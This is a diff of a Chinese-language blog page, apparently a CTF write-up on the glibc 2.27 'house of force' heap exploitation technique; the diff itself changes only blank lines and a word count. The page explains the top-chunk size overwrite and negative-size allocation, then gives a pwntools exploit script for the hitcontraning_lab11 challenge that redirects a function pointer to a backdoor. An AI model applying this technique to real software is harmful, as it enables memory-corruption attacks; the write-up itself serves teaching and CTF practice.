@@ -694,10 +694,8 @@
 <h4 id="实现目的"><a href="#实现目的" class="headerlink" title="实现目的"></a>实现目的</h4><p>任意地址写</p>
 <h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>2.27glibc top chunk分配源代码如下</p>
 <div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = <span class="built_in">chunksize</span> (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  remainder_size = size - nb;			<span class="comment">//分配后剩下的大小</span></span><br><span class="line">  remainder = <span class="built_in">chunk_at_offset</span> (victim, nb);		<span class="comment">//剩下的chunk</span></span><br><span class="line">  av-&gt;top = remainder;							<span class="comment">//更新top chunk</span></span><br><span class="line">  <span class="built_in">set_head</span> (victim, nb | PREV_INUSE |			<span class="comment">//设置从原topchunk分配出的chunk的头部</span></span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  <span class="built_in">set_head</span> (remainder, remainder_size | PREV_INUSE);	<span class="comment">//设置新的top chunk的头部</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_malloced_chunk</span> (av, victim, nb);</span><br><span class="line">  <span class="type">void</span> *p = <span class="built_in">chunk2mem</span> (victim);</span><br><span class="line">  <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
 <p>其中nb定义在<code>checked_request2size (bytes, nb);</code>,这个宏内部定义了nb的值（也就是sz）。<code>_int_malloc (mstate av, size_t bytes)</code>，bytes是该函数的参数，也就是我们调用malloc函数时传进去的数字。<code>nb</code> 实质上是用来存储经过调整后的内存请求大小的变量。</p>
 <div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=						      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Same, except also perform an argument and result check.  First, we check</span></span><br><span class="line"><span class="comment">   that the padding done by request2size didn&#x27;t result in an integer</span></span><br><span class="line"><span class="comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span></span><br><span class="line"><span class="comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span></span><br><span class="line"><span class="comment">   overflow.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line"><span class="meta">(&#123;				    \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);	    \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((sz) &lt; (req))		    \			<span class="comment">//调整后的sz一定要比传入的bytes要大</span></span></span><br><span class="line">      || <span class="built_in">REQUEST_OUT_OF_RANGE</span> (sz)) \		<span class="comment">//一般都会满足，申请的大小不要太大就行</span></span><br><span class="line">    &#123;				    \</span><br><span class="line">      __set_errno (ENOMEM);	    \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;			    \</span><br><span class="line">    &#125;				    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
-
 <p>这里我们如果申请一个大小为负数的chunk，实际上nb经request2size处理后是一个非常大的正数，但加上一定值后溢出，也就实现了正常的正数与负数的运算。我们的topchunk实际上会向低地址处偏移。需要注意的是，申请一个大小为负数的chunk时，这个负数会被unsigned int转换成一个非常大的数。这时如果我们这个转换后的数的大小大于我们修改的top chunk的size，<code>malloc</code> 将尝试扩展堆空间，这时候就会调用 <code>sysmalloc</code>，其中就会报错退出。所我们一般直接把top chunk的size改成-1，也就是0xffffffffffffffff。基本就可以通过所有检测。</p>
 <img  
                      lazyload
@@ -705,10 +703,8 @@
                      data-src="/blog/2024/10/03/house-of-force/image-20241003002907725.png"
                       class=""
                 >
-
 <p>由于我们要精准控制申请后的大小来使top chunk落在想要的位置，也就是要控制request2size(req)的值</p>
 <div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT_MASK (MALLOC_ALIGNMENT - 1)	<span class="comment">//32位系统上通常为0x7,64位上为0xf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ (sizeof(size_t))		<span class="comment">//32位系统上通常为4,64位上为8</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))	<span class="comment">//0x20</span></span></span><br><span class="line"></span><br><span class="line">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></div>
-
 <p>由于<code>(req) + SIZE_SZ + MALLOC_ALIGN_MASK</code>一般都会大于MINSIZE，所以我们就要使我们输入req为<code>target_offset - SIZE_SZ - MALLOC_ALIGN_MASK</code>，这样我们只要target_add是关于16字节对齐的，那么最后申请出chunk就会使top_chunk偏移到我们想要的地址处。</p>
 <h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h5><img  
                      lazyload
@@ -716,16 +712,12 @@
                      data-src="/blog/2024/10/03/house-of-force/image-20241003002919869.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/10/03/house-of-force/image-20241003002937355.png"
                       class=""
                 >
-
-
-
 <p>我们可以发现有对v4中函数指针的调用，而v4是一个指向堆的指针，那么我们就可以想办法改掉其中的函数指针实现任意地址的跳转，而程序中又有magic后门函数，所以思路就是改位于v4+8位置处的函数指针为magic，最后再传入5来调用magic。</p>
 <img  
                      lazyload
@@ -733,60 +725,46 @@
                      data-src="/blog/2024/10/03/house-of-force/image-20241003002948587.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/10/03/house-of-force/image-20241003002955916.png"
                       class=""
                 >
-
-
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/10/03/house-of-force/image-20241003003131870.png"
                       class=""
                 >
-
-
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/10/03/house-of-force/image-20241003003143107.png"
                       class=""
                 >
-
 <p>可以发现change_item方法中我们可以任意控制输入大小，从而造成堆溢出，这里其实也可以用overlapping来构造double free，不过显然house_of_force更快更方便。</p>
 <p>先把板子套上：</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
 <p>具体打法：</p>
 <p>首先溢出改top chunk的size域</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">magic = <span class="number">0x0000000000400D49</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;AAAA&quot;</span>)   <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfffffffffffffff1</span>))</span><br></pre></td></tr></table></figure></div>
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/10/03/house-of-force/image-20241003003151793.png"
                       class=""
                 >
-
 <p>然后算出偏移后申请一个目标大小的chunk</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">off = -<span class="number">0x60</span> - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(off,<span class="string">b&quot;AAAA&quot;</span>)    <span class="comment">#1</span></span><br></pre></td></tr></table></figure></div>
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/10/03/house-of-force/image-20241003003155240.png"
                       class=""
                 >
-
 <p>此时我们发现top chunk已经到了目标位置处，再申请一个chunk就可以改写目标位置函数指针了。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
 
 		</div>
 
@@ -944,7 +922,7 @@
                     </span>
                     
                         <span>
-                            共 120.3k 字
+                            共 120k 字
                         </span>
                     
                 </p>
